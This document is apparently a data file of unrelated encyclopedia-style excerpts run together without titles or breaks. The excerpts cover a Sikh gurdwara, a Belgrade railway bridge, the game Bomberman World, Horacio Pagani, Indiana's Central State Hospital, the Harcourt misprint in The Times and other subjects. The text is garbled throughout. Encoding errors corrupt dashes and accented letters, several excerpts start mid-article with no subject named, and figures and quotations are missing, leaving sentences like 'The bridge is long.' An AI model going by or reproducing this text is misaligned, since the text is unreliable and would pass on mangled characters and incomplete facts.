History This Gurdwara Sahib signifies the tragic happenings that followed the evacuation of Anandpur Sahib by Guru Gobind Singh during the night of 5‚Äì6 December 1705 after agreement was reached between the Sikhs and the Mughal authorities. The Mughal army commander had promised to allow the Sikhs to leave the fort unmolested. On the morning of 6 December 1705, the Guru arrived at this place by the river Sirsa and decided to make a brief halt for the morning religious congregation. However, the Mughal army commander broke the oath taken on Quran and attacked the Guru on the bank of the river. The Sikhs found that the Sirsa river was flooded and swollen by the monsoon rains. After invoking the blessings of the Almighty, Guru Gobind Singh divided his columns into two. While the part of the force was to engage against the enemy, the others were ordered to get across the river. The Guru followed by a small party of Sikhs, rode their horses into the swollen stream with swords in their hands. Guruji along with his four sons and 50 followers and ladies of the home reached the other bank. Many Sikhs died crossing the river. In the chaos two younger sons of the Guru along with their grandmother, got separated. Though some Sikhs got safely across the river, Guru Gobind Singh's family got split and were no longer together. There was no time to look for the missing as the army was close by. The Guru with his two elder sons and 40 Sikhs marched towards Chamkaur.

Critical reception In a 1996 book, Rolling Stone‚Ä≤s Scott Schinder wrote that Scott Miller's \\"off-center genius didn't skip a beat as he transferred his unique perspective to his new group, whose musical muscularity gave his hook-intensive tunes the sonic clout to make them knockouts.\\" Rolling Stone‚Ä≤s 1993 review, by rock critic J.D. Considine, stated that \\"Miller puts his emphasis not on the words but on the melodies, and that pays off big time with songs like 'Sword Swallower,' the power-poppy 'Isaac's Law' and the driving, guitar-crazed 'Jimmy Still Comes Around.'\\" Compared to Game Theory's work, the lyrics remained \\"obsessed with arcana,\\" but Considine concluded that \\"when his songs boast choruses as catchy as the one in 'Take Me Down (Too Halloo),' odds are that you won't really care what the lyrics mean.\\" According to Spin, \\"Sonically, the Loud Family offers a more guitar-heavy approach than Game Theory did, but Miller's songs and voice are immediately identifiable.

Opened in 1979, it was the second railway bridge over the Sava in Belgrade after the Old Railway Bridge in 1884, and fifth in the row of six bridges which span the river in the urban section of the city. It was the first railway bridge in Europe to use cable-stayed girder system, as this type of bridges was used only for the motorways until that point.  History  By the mid-20th century it became clear that the Old Railway Bridge can't service all the traffic. By 1971 the project of the new Belgrade railway junction was green-lighted. It envisioned a new bridge, which would make a direct link between the New Belgrade railway station and the projected central station, Prokop. Though construction of the Maki≈° marshalling yard was given a go first, it was the bridge which was finished before the yard as it was more important object for the entire projected junction. City hall voted a decision to build it some away from the Old Railway Bridge. The construction of the bridge began in 1975. It was designed by Nikola Hajdin, engineer and future president of the Serbian Academy of Sciences and Arts, and Ljubomir Jeftoviƒá. It was decided to use the cable- stayed girder system, which up to that point was used only for the motorway bridges, not a railway ones. The construction was slowed down due to the property issues in the neighborhood of Senjak, where the bridge was to touch the ground on the right bank of the Sava. The emptying and removal of the buildings around the Senjak Marketplace dragged on longer than planned. The placement of the bridge construction was finished in August 1978, followed by painting and anti-corrosion protection. The bridge, constructed by the Mostogradnja company, was completed and opened for traffic in 1979.  Traffic  Though imagined as one of the central pieces of the new railway junction already by the end of the 1970s, it usefulness was connected with the construction of other sections of the project. However, as of 2018, the project is still largely unfinished. The railway tracks were laid over the bridge in the early 1980s and the rail was electrified. The statics testing was conducted in November 1983. Two trains, with 15 cars loaded with crushed stone, were used. Due to the collapsing economy and the wars which followed, the central Prokop station wasn't finished and the traffic over the bridge was light as it couldn't fully serve its purpose. So, the bridge was described as being \\"largely neglected, both in terms of traffic, and the minds of citizens\\". In 2014 the works on the Prokop were intensified and in 2016, still unfinished station, became operational. This was followed by the partial relocation of traffic from the Belgrade Main railway station. Majority of the railway traffic was rerouted to the new bridge in the late 2017 while the Main station was completely closed in July 2018, when the Old Railway Bridge effectively lost its traffic importance, leaving only the new bridge to function over the Sava. As part of the reconstruction project of the Belgrade- Budapest trunk line, the section from Prokop (Centar) to Zemun is undergoing track modernization, which means that at the moment, one of the tracks on the bridge is closed for repairs, employing single-line working.  Characteristics  The bridge is long.

It is part of the Bomberman series. Plot There were once four evil Bombers called the Dark Force Bombers who tried to bring darkness to the Bomberman world. The ancient ancestors of the Bombermen imprisoned the Dark force Bombers in the Blue Crystal. Millions of years later, Bagular, appearing from another point in the time-space continuum, destroyed the Blue Crystal, thus freeing the villains. The freed bombers became Bagular's minions and conquered the four worlds. It is now up to Bomberman to save the worlds from evil. Gameplay Story Mode The goal is to complete all five areas of the five different Bomber worlds. To complete the areas, the player must control Bomberman and set bombs to destroy enemies and obstacles that will lead to the exit. To be able to complete each level, the player must locate and pick up all of the Crystals on the map. Once this is complete, the door to the exit will open, and the player is allowed to move on to the next area. In the fourth area of each world, the player will have to defeat a Dark Force Bomber, and an extra boss that is themed after the type of world the setting is in. Once the player defeats a Dark Force Bomber, the player is given a unique battle armor to wear for the next boss battle, which has a normal attack and a special attack. The battle armor is only used for the boss battles, meaning once the player advances to the next world, the battle armor will be lost. As such, it is recommended that players take full advantage of the armor. Multiplayer In multiplayer mode, the last one standing is the winner. Set bombs to destroy other bombers. There are different modes to play at, such as \\"Single Match\\" and \\"Maniac Mode\\", and the player or players are able to choose one of ten different unique maps to battle on, each map having a different twist and theme to the gameplay. The objective is to blow up blocks or obstacles to be able to advance towards other bombers and catch them with the fire from a bomb. When obstacles are blown up, items frequently drop from them. Single Match Single Match is a basic game in which five Bombers are on a map chosen before the game starts. The player can choose \\"Tag Match\\" or \\"Battle Royal\\", with Tag Match being able to choose two teams to fight, and Battle Royal for a free-for-all on all five players. There are other options that can be determined, like number of rounds to win in order to win altogether, time limit for each round, Sudden Death, Bad Bomber, and others. Sudden Death happens once a certain amount of time has passed, and the map starts to fall apart rapidly, killing any player who happens to be standing on a space that disappears. Bad Bomber is an option that allows a defeated player to hover around the edge of the map and shoot bombs onto the map in hopes of taking out other Bombers. Setting the Bad Bomber option to \\"Super\\" results in the event that a Bad Bomber kills a Bomber, that Bad Bomber will come back to life. Maniac Mode Maniac Mode is another type of multi-player game setting, in which the players choose which items they want to have appear on the field, and how many. Possibilities range from having maximum fire matches with other players, or merely a max amount of bombs with no firepower, as well as gaining special powers that cannot be obtained during normal Single Match play, such as the item that allows players to walk through walls. Special Mode This mode allows the player to play a special level with a pre-determined amount of time to complete (only options are two-minutes and five-minutes), as well picking a selection of items to start with. There are three selections, each containing three different items, or amounts of a certain item. The object of the Special Mode is to rack up as many points as possible, done best by defeating numerous enemies within the same blast of a bomb, and picking up letters. Defeating the Boss at the end of the level yields a large number of bonus points. The game is over once the player dies, or defeats the boss. When a game ends, the player is ranked on the number of points he or she acquired before they lost or won. Higher points will result in a positive ranking (like Good Bomber) and low points will result in a negative ranking (like Worst Bomber). It is unclear whether or not the rankings have anything to do with the game (because there is no High-Score board) other than being a self-accomplishment for the player to achieve the best ranking possible. Development Bomberman World was shown at the September 1997 Tokyo Game Show under the title PlayStation Bomberman.  Reception  Man!ac gave the game a score of 75/100.

He is the founder of Pagani Automobili S.p.A., an Italian specialty auto-maker. Prior to founding his own company, Pagani worked for Renault and Lamborghini.  Personal life  Horacio Pagani was born in Casilda, Argentina to Luca and Maria Pagani. His father, Luca, was a baker from Italy. Career Pagani took an interest in engineering while still living in Argentina. However, he felt from the beginning that the rural town in which he was born would not be adequate for the engineering career he dreamed of. He opened a small shop where he worked at a very young age, gaining valuable experience in craftsmanship. Pagani's emergence as a talented engineer came when he was hired by Renault to improve the body of a racing car. His work offered staggering improvements and Pagani was able to showcase his talent. After having success in this sort of small scale, Pagani visited Lamborghini and met with the company's chief technical director Giulio Alfieri. In 1982, he decided to move to Italy and he was hired by Lamborghini. Pagani began working basic jobs such as sweeping the floor, however he was able to work his way up the company. At the age of 20, Pagani had designed and built his first F3 racer. He was a chief engineer at Lamborghini and he built the Countach Evoluzione concept. He tried to persuade Lamborghini to buy an autoclave so they could extend the production of the carbon parts for the Evoluzione. They refused, saying that Ferrari did not have an autoclave, so Lamborghini didn't need one. Pagani borrowed the capital to buy his own autoclave late in 1987 and then, in 1991, he broke away from the company and founded his own consultancy called Modena Design which continues to make carbon fiber composites for Formula One cars and clients like Daimler, Ferrari and Aprilia. Pagani Automobili Modena was founded by Pagani in 1992. The first car he produced was the Zonda which took seven years to complete. His second car produced is the Huayra. It is named after Huayra Tata, the god of the wind in Incan Culture. References Bibliography \\"Pagani, the Story of a Dream\\". Roberto Morelli, Hugo Racca, 2010.

It is located on the grounds of what was formerly Central Indiana Hospital for the Insane, later shortened to Central State Hospital. It was placed on the National Register of Historic Places on April 25, 1972, as the Old Pathology Building. It is the United States' oldest surviving pathology laboratory. History Central State Hospital administrator George F. Edenharter, who served in the position from 1893 to 1923, decided a building was required for pathology and hired Adolph Scherrer to be the architect of the project. The building was constructed in 1895 and opened as the Pathological Department of Central State Hospital. When constructed, the two-story brick building was considered \\"state of the art\\", with a 150-seat teaching amphitheater, bacteriological and chemical research facilities, and the hospital's morgue. It also contains an anatomical museum, autopsy room, library, mental research laboratories, and a photography room. Note: This includes and Accompanying photographs The Central College of Physicians and Surgeons and the Medical College of Indiana taught neurology and psychiatry from 1900 to 1908 until both were merged with the Indiana University School of Medicine. The Indiana University School of Medicine would continue to lecture in the building until 1956. Lecture topics included nervous system development, 'manic-depressive psychosis,' insanity classification, and circulation of the brain and spinal cord. Students from nearby medical colleges traveled to the Old Pathology Building to view autopsies. Central nervous system syphilis was the most significant subject studied at the building, especially in the 1920s and 1930, because the disease was the specialty of Walter Bruetsch and because the disease was so prevalent in facilities like Central State. Scientific psychiatry was diminishing in the 1930s, and most similar facilities in the United States closed by the 1940s, but Central State's facility was still being used in 1955. Most of the buildings of Central State Hospital were in poor condition and were torn down in the 1960s and 1970s. The old pathology building was still in excellent shape, and all its records remained usable because a few doctors used the buildings in a token manner just to state that it was still in use. In 1969, the Indiana Medical History Museum was established, using the old pathology building. Since 1984, the museum has been open to the public at least once a week. Museum The Museum is a not-for-profit organization that collects various relics, with over 15,000 by 1994, all related to medical history rather than just pathological items. A gallery to show rotating themes opened in 1990. The movie Eight Men Out filmed scenes in the library. In 2006, the museum received a federal grant through the Indiana Department of Natural Resources of $44,100 to repair the plumbing within the building.

Only the second non-engineering honor society at Armor Tech, Pi Nu Epsilon was founded by four members of the class of 1927, four members of the class of 1928, and Professor Emeritus Charles Wilbur Leigh. Pi Nu Epsilon aided the musical organizations at the Alpha chapter by sponsoring and promoting the musical activities on campus. It thrived for many years under the guidance of Dr. O. Gordon Erickson, who served as Music Director at Armour Institute of Technology from 1932 until his death in August 1953. In 1940, Armour Institute of Technology and Lewis Institute merged to form the Illinois Institute of Technology. Pi Nu Epsilon was formally incorporated as a nonprofit organization in the state of Illinois on May 16, 1947, by DeWitt H. Pickens, John G. Seeger Jr., Hans H. Nord, and James W. Leichti.

Agn√®z Beyinc√©  Agn√®z Beyinc√© (born Agn√®s DeRouen; 1909-1984), was a Louisiana native, whose birth surname and passion for creating beauty from the mundane is the inspiration for House of Der√©on, a fashion line founded by her daughter, Tina Knowles, and her granddaughter, Beyonc√© Knowles. Agn√®z Der√©on was born on July 1, 1909 in Delcambre, Louisiana, a town near the city of New Iberia, Louisiana. Der√©on was the daughter of Eug√®ne Gustave \\"Eugenie\\" DeRouen (1860‚Äì1937) and Odilia Broussard (daughter of E.R. Broussard and Josephine Lesser). She and her family were Louisiana Cr√©oles. Self-taught, she became a well-known seamstress catering to private clients in Louisiana. She was accustomed to tailoring pieces that stood out by decorating the fabrics she used with such embellishments as embroidery, appliques and smocking. Incorporating materials such as lace, beads and jeweled buttons, Der√©on made her style unique, according to the House of Der√©on official website. Der√©on, later, married Lumis Beyinc√© of Abbeville, Louisiana, at which point her surname changed from Der√©on to Beyinc√©. Lumis was the son of Alexandre Beyinc√© (Boyanc√©) and Marie Olivier. The couple relocated to Galveston, Texas where they raised their family (some of the Beyinc√© relatives still live in Galveston). Both Agn√®z and Lumis Beyinc√© were French-speaking Creoles of predominantly French, African and Native American descent. The Beyinc√© family was upwardly mobile. The couple made many sacrifices to see that their children matriculated through private school and received a proper education. In an interview with Ebony magazine, Tina Knowles recalls that her mother made altar boy robes and other garments for the church so her children could attend Catholic schools.  Controversy  In May 2008, the fashion line released advertisements for its girls line called \\"The Der√©on Girls Collection\\". The fashion line infuriated critics when the advertisement displayed seven-year-old girls in full makeup and high heels. A poll online on the Washington Post website has stated that 62% of the readers believe the advertisements oversexualize young girls.

Plot A naive country boy named Benny Miller (Lou Costello), from Cucamonga, California, has been taking correspondence phonograph lessons in salesmanship. Upon completion of the course, he leaves his mother (Mary Gordon) and his girlfriend Martha (Elena Verdugo) to pursue a career in Los Angeles. He arranges a meeting with his Uncle Clarence (George Cleveland), a bookkeeper with the Hercules Vacuum Cleaner Company. When he arrives to ask for a job, the sales manager, John Morrison (Bud Abbott), mistakes him for one of the auditioning fashion models and has him remove his clothing. Morrison's secret wife, Hazel Temple (Jacqueline deWit), discovers the mistake and suggests that Benny be hired to avoid an accounting scandal, as they have been \\"cooking the books\\". Unfortunately, Benny is fired from his salesman post after only one day. Clarence transfers Benny to the company's Stockton branch, which is run by Morrison's cousin, Tom Chandler (also played by Bud Abbott). Benny's misfortunes continue, including a prank played on him by his new coworkers when they convince him that he can read minds. However, the prank gives Benny sufficient confidence to become Hercules' 'Salesman of the Year'. He is sent back to the Los Angeles branch to receive his award, and while demonstrating his 'abilities' to Morrison, he alludes to the fact that Morrison has a secret bank account. Morrison sends his wife (Hazel) to obtain more information from Benny to determine what he actually knows. Hazel and Benny go to her apartment, where Benny becomes ill after smoking a cigar. Hazel then gives Benny a sedative, but accidentally takes it herself while he falls asleep from the cigar's ill effects. Morrison arrives home to find the two asleep together and fears the worst. At the awards ceremony that evening, Benny learns of the mind-reading ruse, and overhears Morrison speaking ill of him. Benny returns to his mother and his girlfriend in Cucamonga, where he also encounters Chandler, his coworker Ruby (Brenda Joyce), and the Hercules company president, Mr. Van Loon (Pierre Watkin). They announce that Morrison has been fired, and has been replaced by Chandler. Benny is now sales manager of the Cucamonga district.

The name Bauernroulette indicates it is a \\"poor man's roulette\\", since BauerTranslation of 'Bauer': dict.cc is German for 'peasant', 'farmer' or 'one of a chiefly European class of agricultural laborers'. In Bauernroulette, a spinning top is spun in the middle of a wooden circular playing surface that contains 6 wooden balls. The balls bounce off the top in random directions, and sometimes land within one of several hollow indentations within the surface, or pass through a small hole into chambers that are located outside the spinning surface area. Typically, the most points are scored by landing balls within these outer chambers. Skilled players are often able to spin the top such that it remains in motion for more than 30 seconds. An image of an older version of the game, the new one (available on the internet) is octagonal in shape, with eight 'bowls' instead of four on the outside.  Rules  # Place the 6 balls (4 white, 1 red, and 1 green) in the center of the playing field. # Set the whipping top near them and spin it. # The balls will be shot into the small hollows or bowls. # Each hollow or bowl in which the balls come to rest have a point value associated with them. Add up the points of each of the hollows in which a ball has come to rest. # If the red ball is in a hollow, double the number of points for that ball. # If the green ball is in a hollow, the points are subtracted from the sum obtained by the other 5 balls. # Sometimes balls will fly out of the playing surface. These balls are out for that round and can not be replaced while the top is still spinning. # A player scoring with all 6 balls gets to spin the top again. # The winner is the player who first reaches a point total that is agreed upon before the game. Normally this total is 1000 points.CasinoObserver - Bauernroulette. Retrieved 2013-01-07.

WCZE is licensed by the FCC to Jennifer and Edward Czelada. Jennifer and Edward Czelada are the founders of non-commercial Superior Communications, Michigan Community Radio, Northland Community Broadcasters, and Smile FM. WCZE began broadcasting in April 2005 from a 450-foot tower near Ubly, Michigan, which is one of the highest land areas in the thumb. The combined tower height and land elevation gives WCZE a total antenna height of 1289 feet above sea level. The station has a signal that covers the thumb area of Michigan and can be heard out to Bay City, Imlay City, Tawas City and often as far as London, Ontario. Oddly, the station broadcast without a license to cover for nearly 7 years due to a complaint filed by Thumb Broadcasting, Inc. (owners of WLEW and WLEW-FM in Bad Axe, Huron County's only other commercial radio stations) with the FCC stating the station wasn't providing a strong enough signal to Harbor Beach. The station disputed the claim, but also offered to slightly increase power to 47 kW. On March 26, 2012, the FCC found in WCZE's favor and granted a license of the original construction permit. WCZE relayed Smile FM until the new Smile FM station, WSMB (FM) 89.3 Harbor Beach came on the air.

American Art. The University of Chicago Press. 6: 2 (Spring, 1992). p. 75. The emerging women artists created works with a different perspective than men, challenged the limited concepts of femininity and created a genre of floral- female landscape paintings, in which \\"the artist placed one woman or more in a flower garden setting and manipulated composition, color, texture and form to make the women look as much like flowers as possible.\\" These artists were among the educated, sophisticated \\"New Women\\" beginning in the late 19th century, whose influence was largely ignored by art scholars. Cooper was one of the well-educated artists who became a successful landscape painter and academic figure who began as a children's book illustrator and painter of miniatures and flower paintings. Realizing the difficulty in making the transition to a successful painter, particularly of landscape and figure paintings, Cooper warned other women artists of the difficulty in creating a successful career in such works. She, however, was able to overcome the obstacles and become a successful landscape artist. Cooper was a member of the Women's International Art Club in London, Pennsylvania Academy of Fine Arts and the Women's Art Association of Canada. In New York, she was a member of Woman's Art Club, National Arts Club, and the New York Watercolor Club. She was a charter member of the Rochester Art Club and the Philadelphia Water Color Club.

Overview In the game, the hero Opi (Doraemon in the Japanese version) is traveling through time with four of his friends when they are captured by the villain Zenzombie. He travels through various eras in time (modern, samurai, future, World War II and prehistory), collecting treasure to open doors to the next era, and kills enemies by digging holes and burying the enemies. Every 15 of the game's 60 levels, Opi rescues one of his friends. Levels 30 and 60 are boss levels where an enormous enemy floats around the screen and can kill Opi with a single touch.

History Central Indiana Hospital for the Insane, c. 1903 The Indiana legislature authorized the establishment of a \\"hospital for the insane\\" as early as 1827, but actual construction of a facility was delayed for several years. The Indiana Hospital for the Insane finally opened in November 1848 with a total of five patients. At that time, the hospital consisted of one brick building situated on a large parcel of land of over on Washington Street, west of downtown Indianapolis. In 1889 the hospital was renamed the Central Indiana Hospital for the Insane. After 1926 it was known as Central State Hospital, and by 1928, physicians cared for nearly 3,000 patients. From 1848 to 1948, the hospital grew yearly until it encompassed two massive ornate buildings (one for male and one for female patients); a pathological department; a \\"sick\\" hospital for the treatment of physical ailments; a farm colony where patients engaged in \\"occupational therapy\\"; a chapel; an amusement hall complete with an auditorium, billiards, and bowling alleys; a bakery; a fire house; a cannery manned by patients; and idyllic gardens and fountains. The more ornate of the two massive buildings came to be known as \\"the Seven Steeples\\". This building, which housed female patients, was designed using the Kirkbride Plan for mental healthcare facilities. For a half-century, this complex buildings and gardens housed mentally ill patients from all regions of Indiana. By 1905, however, the state had built mental health institutions in Evansville, Logansport, Madison, and Richmond, thereby relieving an overcrowded Central State Hospital of some of its patient load and leaving it to treat only those from the \\"central district\\", an area of 38 counties situated in the middle portion of the state. In 1950 patient population reached 2,500 By the early 1970s, most of the hospital's ostentatious Victorian-era buildings had been declared unsound and razed. The Men's Department Building (also a Kirkbride Plan structure) had been demolished already in 1941. In their place, the state constructed brick buildings of a nondescript, institutional genre. These modern buildings and the medical staff therein continued to serve the state's mentally ill until allegations of patient abuse and funding troubles sparked an effort to forge new alternatives to institutionalization which, in turn, led to the hospital's closure in 1994. Current status The 1886 Power Plant The grounds of Central State Hospital were still largely vacant as of 2011. In place of the demolished Women's Ward (Seven Steeples) is a large lawn. There are approximately 10 buildings on the grounds that were associated with the hospital. The Pathology Department building, built in 1895, is well preserved and houses the Indiana Medical History Museum. The three more modern wards (Evans, Bolton, and Bahr) were built in 1974 when the others were demolished. The oldest building on the property is the old power house, built in 1886. The Administration building, which was built in 1938, is now most commonly associated with the hospital, although it never housed patients. In 2005, the Beckmann Theatre was granted temporary occupancy of the 1895 Laundry Building where it staged its production of \\"Asylum\\". More recently, the building has been used for storing cars. The Indiana State Archives, the Indiana State Library, and the Indiana Medical History Museum (housed in one of the hospital's remaining nineteenth-century edifices), are preserving the history of an institution that served the mentally ill of Indiana for 146 years. Buildings on the Grounds of Central StateIn March 2003, the city of Indianapolis purchased the property from the state for $400,000. The land that was acquired consists of located on the city's westside at the 2800-3300 blocks of West Washington Street. The site is also the subject of the 2006 film Central State: Asylum for the Insane, a documentary, produced and directed by independent filmmaker Dan T. Hall of Vizmo Films. In late 2013, several buildings, including the former Administrative Building as well as the prominent Powerhouse, were purchased by a company known for refurbishing buildings otherwise left to waste. The project to turn the administrative building into student apartments began in January 2014, with students expected to move in by August 2014 for the fall semester. Several students were able to move in, but construction still continues in September 2014. The building is now named Central State Mansion and withholds original features of the architecture as well as decorations suggestive of its history.

Her career was international, and she appeared at leading theatres in both Europe and America. Singing career Born in Turin in 1850, Scalchi studied voice with Augusta Boccabadati. In 1866, she made her stage debut in Mantua as Ulrica in Giuseppe Verdi's Un ballo in maschera. Her first major international success came at the Royal Opera House, Covent Garden, where on November 5, 1868, she made her London debut as Azucena in Il trovatore, also by Verdi. She appeared with the Covent Garden company thereafter until 1890, performing most of the standard lower-pitched female operatic roles. These included Urbain, Amneris and Arsarce, among others. Meanwhile, in 1882-83, she toured the United States for the first time, singing on that occasion with Mapleson's company. Scalchi helped to make history when she sang in the newly constructed New York City Metropolitan Opera's first ever staged work, Charles Gounod's Faust, which inaugurated the theatre on October 22, 1883. She returned to Mapleson's troupe a year later but went back to the Metropolitan in 1891, where she would spend five further seasons. Scalchi created no significant new operatic roles during her long stint at Covent Garden. She did, however, take part in a number of important American premieres, including those of Verdi's last two masterpieces, Otello and Falstaff. She appeared, too, in the initial American productions of Amilcare Ponchielli's La Gioconda and Umberto Giordano's Andrea Ch√©nier. Scalchi retired from the Met in 1896 and formed her own private company of singers a year later, which then undertook a final American tour. Commentators praised Scalchi during her prime for the strength, wide range and remarkable agility of her voice, although she was said to have possessed distinct breaks between each of her registers. She never made any gramophone records. Her death occurred in Rome in 1922. Personal life In 1875‚Äì76 she wed Count Luigi Alberto Lolli, an aristocrat from Ferrara, thus becoming the Countess Lolli. After her marriage, she was often addressed privately and billed publicly on theatrical posters or programs as \\"Sofia Scalchi-Lolli.\\" References * David Ewen, Encyclopedia of the Opera: New Enlarged Edition; New York, Hill and Wang, 1963. * Harold Rosenthal and John Warrack, editors, The Concise Oxford Dictionary of Opera, second edition; London, Oxford University Press, 1980. * Lahee, Henry Charles.

It was directed by William Witney and John English. While not often considered a great serial, as it contains much stock footage and two recap chapters, it is famous for its main villain, the Lightning--the first costumed supervillain. There is some speculation that George Lucas used the Lightning as a template for Darth Vader. Plot In Singapore, two Marine Lieutenants, Tom Grayson and Frank Corby, uncover the threat of a masked terrorist called the Lightning, who uses an arsenal of powerful lightning- based weaponry in his bid for world conquest. However, the battle becomes personal when the Lightning annihilates the officers' unit and later kills Lt. Grayson's father as he was helping the investigation of the weapon. Now, the marines have dedicated themselves to stopping the Lightning and bringing him to justice. Cast * Lee Powell as Lt Tom Grayson * Herman Brix as Lt Frank Corby * Eleanor Stewart as Janet Warfield * Montagu Love as General White * Hugh Sothern as Ben Warfield/the Lightning * Sam Flint as Col Grayson * Perry Ivins as Crenshaw * Forrest Taylor as Benson * John Picorri as Prof Gould Production The Fighting Devil Dogs was budgeted at $94,656 although the final negative cost was $92,569 (a $2,087, or 2.2%, under spend) making it one of only three pre-war Republic serials to be produced under budget. It was the cheapest Republic serial of 1938 and the second cheapest of all Republic serials. It has two recap chapters rather than the usual one (or sometimes none), in which the entire plot of the serial so far is repeated, and makes extensive use of stock footage. The cheapest Republic serial was The Vigilantes Are Coming (1936) at $87,655, while the next cheapest after The Fighting Devil Dogs is Undersea Kingdom (also 1936) at $99,222. It was filmed between 10 March and 29 March 1938. The serial's production number was 793. One of the directors, William Witney, believed this to be one of the worst of the serials he ever made. The Lightning's Flying wing was taken from the earlier Dick Tracy serial. Aviation was one of the most popular serial genres of the early 1930s, along with Westerns and Jungle serials. Aviation films were even expected to displace Westerns as the most popular genre but science fiction took over instead. Writer Raymond William Stedman claims that the science fiction Flying Wing in this serial was the beginning of the process that killed interest in ordinary aviation. Release Theatrical The Fighting Devil Dogs' official release date is May 28, 1938, although this is actually the date the sixth chapter was made available to film exchanges. A 69-minute feature film version, created by editing portions of the serial footage together, was released on January 29, 1943. Television In the early 1950s, The Fighting Devil Dogs was one of fourteen Republic serials edited to six 26¬Ω-minute episodes for TV syndication. Subsequently, it became one of twenty-six Republic serials edited into a TV-movie in 1966, each of which features ran 100 minutes. The title of this version was Torpedo of Doom. Critical reception The Fighting Devil Dogs is, in Cline's opinion, one of the best mystery serials ever released, with a \\"colourful\\" mystery villain, \\"stirring\\" musical score and \\"magnificent\\" editing. He also notes that it is \\"apparently one of the least costly\\" serials ever released, with two recap chapters and stock footage taken from newsreels and earlier serial releases.

The Harcourt interpolation was a scandal of Victorian London in which a rogue compositor inserted an obscene remark into a page proof for The Times newspaper, in the middle of a speech by a leading politician of the day. The addition was not noticed until after the first edition had been printed and efforts to recall the copies were not entirely successful. Article In January 1882, as Parliament was not sitting, The Times included lengthy verbatim reports from speeches given by politicians outside Parliament. On Sunday 22 January, the Attorney General Sir Henry James and Home Secretary Sir William Harcourt went to Burton upon Trent to open the St Paul's Institute, afterwards addressing speeches towards a crowd of between 7,000 and 8,000.\\"The Home Secretary and the Attorney-General at Burton\\", The Times, 23 January 1882, Second edition, p. 7. Harcourt made reference to a by-election campaign then being fought in the North Riding of Yorkshire (polling day was Thursday 26 January), in which the Liberal candidate, Samuel Rowlandson, was a tenant farmer. The Times decided to print a verbatim report of both speeches in the edition to be published on the next morning, Monday 23 January 1882. The Times' compositors were in dispute with the newspaper managementPeter Brown, \\"Who will the journalists blame now?\\", The Times, 29 September 1992. and the report of Harcourt's speech printed in the first edition read (the '/' represent end-of-line in the original): The interpolation was not noticed until after the first edition had been printed and distributed. The Times sent out urgent telegraph messages to recall all unsold copies.Bob Clarke, \\"From Grub Street to Fleet Street: an illustrated history of English Newspapers to 1899\\", Ashgate Publishing, 2004, p. 240-1. Removal According to the collector of erotic literature Henry Spencer Ashbee, when spotted the line was replaced by stars in subsequent editions.'Pisanus Fraxi', \\"Catena librorum tacendorum, being Notes Bio- Icono- graphical and Critical, on Curious and Uncommon Books\\", London, 1885, p. iv. Sir William Harcourt's son Lewis noted in his diary that the \\"disgraceful interpolation of an obscene line\\" had been \\"discovered before the second edition was published and so it only appears in the first\\".\\"Loulou: selected extracts from the journals of Lewis Harcourt (1880‚Äì1895)\\", edited by Patrick Jackson, Farleigh Dickinson University Press, 2006, p. 34. Talk about the misprint became widespread and many curious people sought to see it; this demand combined with the restricted supply (due to The Times efforts to recall all copies containing it) to raise the market price of editions containing it. A newspaper with a cover price of 3d. was changing hands for 12s. 6d. by the middle of the morning. Sir Edward Walter Hamilton noted in his diary on 26 January that copies were selling \\"at all sorts of fancy prices\\" and reported that Lord Wolverton had told him they were fetching 20s. at Brighton on 25 January.\\"The Diary of Sir Edward Walter Hamilton 1880‚Äì1885\\", Oxford University Press, 1972, vol I, p 214. The Dublin Freeman's Journal reported that ¬£5 was being offered for copies.\\"London Correspondence\\", Freeman's Journal and Daily Commercial Advertiser, 24 January 1882, p. 5. Apology A revised copy was printed for subscribers and for libraries that kept bound copies, but The Times wrote nothing more about the incident immediately. Sir Edward Walter Hamilton noted on 26 January that Sir William Harcourt had not received an apology, and wrote that \\"Harcourt will never hear the end of it\\" (although Hamilton regarded the story primarily as amusing). However an apology appeared in the issue for Friday 27 January 1882: Sir Edward Walter Hamilton noted that the effect of this paragraph was to draw \\"more attention than ever to the compositor's obscene line\\".\\"The Diary of Sir Edward Walter Hamilton 1880‚Äì1885\\", Oxford University Press, 1972, vol I, p 216. The incident was reported by the Portuguese writer, journalist and diplomat E√ßa de Queiroz in an article which now forms part of his book Cartas de Inglaterra. Samuel Palmer, in compiling a quarterly index to The Times, included a reference:\\"Palmer's Index to The Times\\", Winter Quarter January 1 to March 31, 1882, p. 45. Later developments According to Peter Brown, production editor of The Times in 1992, the compositor responsible was identified after an inquiry as G. Price; fellow Times journalist Philip Howard described him as \\"a disgruntled compositor who had been given his cards\\".Philip Howard, \\"'It is a paradox that the F-word, the most frequently used word in English, is unprintable. Serious publications can print it only after sober reflection'\\", The Times, 8 October 1999, p 24. A few months later a similar addition was made to an advertisement for the book Everyday Life in Our Public Schools in the issue of The Times for 12 June 1882. This book was said to include \\"a glossary of some words used by Henry Irving in his disquisitions upon fucking, which is in common use in these schools\\". The Times maintained a dignified silence about it, but for many years after it was a rule on the paper that any compositor who was sacked left immediately with a payoff and did not work out a period of notice.Fritz Spiegl, Keep Taking The Tabloids, Pan, 1983, p. 44-46. The copy of the edition containing the misprint delivered to the Library of the British Museum was removed from the general collection and suppressed. Bob Clarke, author of 'From Grub Street to Fleet Street', reported that a copy of The Times featuring the misprint had changed hands for ¬£100 at an auction in the mid-1990s.

He was first appointed to the Imperial Astronomy Bureau to help institute a calendar reform. He eventually ascended to deputy of the Imperial Astronomy Bureau and designed the Linde calendar. His father was an educated state official and also a Taoist. Li died in Chang'an in 670. Background and career The Sui Dynasty was integral for uniting China, so it was a good time for learning. But when Li was sixteen the Sui fell, and the Tang rose. Nevertheless, the Tang did not harm the conditions for education. Indeed, it rather strengthened it. The Imperial Academy's math teaching was formalized. He was appointed into the Imperial Astronomy Bureau as an advanced court astronomer and historian, in 627. Once several years had passed, he then was promoted to deputy director of the Imperial Astronomy Bureau in 641, and even director in 648. He was given these titles because the Chinese calendar of the era, despite that it had only been used for several years, was already having accuracy problems in predicting eclipses. In fact, Li was appointed partially because of his critique of the Wuyin calendar. Wang Xiaotong had been chosen to study the problem earlier. This was a very important job because of the Chinese belief in the Mandate of Heaven. So if one altered the calendar, that person would have some control over the connection between the heavens and the emperor. Astronomy and calendar In 665, Li introduced a reform calendar. It was called the Linde calendar. It improved the prediction of planets' positions and included an ‚Äúintercalary month.‚Äù That is similar to the idea of a leap day. It would catch up a lunar year to a solar year because twelve lunar months are 1.3906 days short of one solar year. It was added every three years. The Linde calendar is the most prominent accomplishment of Li. Li wrote a document complaining about the use of outdated equipment in the Imperial Astronomy Bureau, so he was commanded to construct a new armillary sphere. He completed it in 633. His construction had an additional third ring as opposed to the more common design of only two rings. 